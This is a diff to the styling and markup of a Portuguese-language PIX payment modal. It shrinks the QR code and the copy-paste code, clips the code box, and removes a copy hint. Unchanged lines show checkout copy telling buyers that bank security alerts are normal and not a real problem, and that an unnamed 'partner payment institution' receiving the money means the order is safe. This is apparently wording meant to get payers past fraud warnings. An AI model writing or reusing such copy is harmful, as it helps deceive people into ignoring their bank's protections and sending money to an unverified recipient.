@@ -208,11 +208,11 @@
     .pix-top-close { background: none; border: none; cursor: pointer; width: 44px; height: 44px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 17px; color: #555; transition: background .2s; -webkit-tap-highlight-color: transparent; touch-action: manipulation; }
     .pix-top-close:active { background: rgba(0,0,0,.12); }
     /* Só o conteúdo scrolla */
-    .pix-content { padding: 12px; overflow-y: auto; -webkit-overflow-scrolling: touch; flex: 1; padding-bottom: env(safe-area-inset-bottom, 20px); }
-    .pix-card { background: #fff; border-radius: 14px; padding: 18px 16px; margin-bottom: 12px; box-shadow: 0 1px 5px rgba(0,0,0,.07); }
-    .px-qr-wrap { display: flex; flex-direction: column; align-items: center; gap: 0; margin-bottom: 8px; position: relative; }
+    .pix-content { padding: 0 12px 12px; overflow-y: auto; -webkit-overflow-scrolling: touch; flex: 1; padding-bottom: env(safe-area-inset-bottom, 20px); }
+    .pix-card { background: #fff; border-radius: 14px; padding: 8px 16px 18px; margin-bottom: 12px; box-shadow: 0 1px 5px rgba(0,0,0,.07); }
+    .px-qr-wrap { display: flex; flex-direction: column; align-items: center; gap: 0; margin-bottom: 6px; position: relative; }
     .px-qr-skel {
-      width: 160px; height: 160px; border-radius: 12px; border: 2px solid #eee;
+      width: 140px; height: 140px; border-radius: 12px; border: 2px solid #eee;
       background: #f0f0f0; position: relative; overflow: hidden; flex-shrink: 0;
     }
     .px-qr-skel::after {
@@ -222,13 +222,13 @@
     }
     @keyframes imgShimmer { 0%{background-position:-200% 0} 100%{background-position:200% 0} }
     .px-qr-img {
-      width: 160px; height: 160px; border-radius: 12px; border: 2px solid #eee;
+      width: 140px; height: 140px; border-radius: 12px; border: 2px solid #eee;
       object-fit: contain; opacity: 0; transition: opacity .25s ease;
       position: absolute; top: 0; left: 0;
     }
     .px-qr-img.qr-loaded { opacity: 1; position: relative; }
-    .px-code-label { font-size: 12px; font-weight: 600; color: #888; text-transform: uppercase; letter-spacing: .4px; margin-bottom: 8px; }
-    .px-code-box { background: #f5f5f5; border: 1.5px dashed #ddd; border-radius: 10px; padding: 12px 14px; margin-bottom: 6px; font-family: monospace; font-size: 11px; color: #444; word-break: break-all; line-height: 1.6; cursor: pointer; transition: background .2s; }
+    .px-code-label { font-size: 9px; font-weight: 600; color: #888; text-transform: uppercase; letter-spacing: .4px; margin-bottom: 4px; }
+    .px-code-box { background: #f5f5f5; border: 1.5px dashed #ddd; border-radius: 10px; padding: 6px 10px; margin-bottom: 6px; font-family: monospace; font-size: 9px; color: #444; word-break: break-all; line-height: 1.6; cursor: pointer; transition: background .2s; max-height: 36px; overflow: hidden; }
     .px-code-box:hover { background: #efefef; }
     .px-code-hint { font-size: 11px; color: #bbb; text-align: center; margin-bottom: 8px; display: flex; align-items: center; justify-content: center; gap: 4px; }
     .px-copy-btn { width: 100%; background: #ffcc01; color: #1a1a1a; border: none; border-radius: 24px; padding: 15px; font-family: 'Poppins', sans-serif; font-weight: 700; font-size: 15px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: background .2s, color .2s; }
@@ -393,13 +393,13 @@
 
         <div class="pix-card">
 
-          <div style="background:#fff8e1;border:1px solid #ffe066;border-radius:10px;padding:9px 12px;margin-bottom:6px;display:flex;align-items:flex-start;gap:8px;">
+          <div style="background:#fff8e1;border:1px solid #ffe066;border-radius:10px;padding:9px 12px;margin-bottom:4px;display:flex;align-items:flex-start;gap:8px;">
             <span style="font-size:13px;flex-shrink:0;margin-top:1px;">⚠️</span>
             <div style="font-size:11.5px;color:#5a4000;line-height:1.5;">
               Alguns bancos exibem alertas de segurança automáticos. Isso é normal em compras online e não representa problema real.
             </div>
           </div>
-          <div style="font-size:11px;color:#666;text-align:center;margin-bottom:12px;line-height:1.5;">
+          <div style="font-size:11px;color:#666;text-align:center;margin-bottom:8px;line-height:1.5;">
             O recebedor é nossa instituição de pagamentos parceira.<br>Seu pedido está seguro e garantido. ✅
           </div>
 
@@ -411,7 +411,6 @@
 
           <div class="px-code-label">Código PIX copia e cola</div>
           <div class="px-code-box" id="px-code-box" onclick="copiarCodigo()">...</div>
-          <div class="px-code-hint"><i class="fa fa-hand-pointer" style="color:#ccc"></i> Clique no código para copiar</div>
 
           <button class="px-copy-btn" id="px-copy-btn" onclick="copiarCodigo()">
             <i class="fa fa-copy"></i> Copiar código PIX
